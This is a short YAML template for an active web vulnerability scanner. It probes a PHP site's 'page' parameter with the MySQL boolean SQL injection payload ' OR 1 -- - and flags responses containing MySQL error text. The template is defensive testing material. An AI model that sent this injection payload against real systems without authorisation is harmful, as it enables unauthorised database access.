id: patt-sqli-mysql-bool-02-page
name: 'PATT sqli patt-sqli-mysql-bool-02 via page'
severity: high
type: active
tags:
  - sqli
  - patt
requires:
  - php
description: 'PATT MySQL boolean with comment -- -. [patt:patt-sqli-mysql-bool-02] [patt_source:https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md]'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      page:
        - ''' OR 1 -- -'
    matchers:
      - type: regex
        part: body
        regex:
          - 'SQL syntax'
          - 'mysql_fetch'
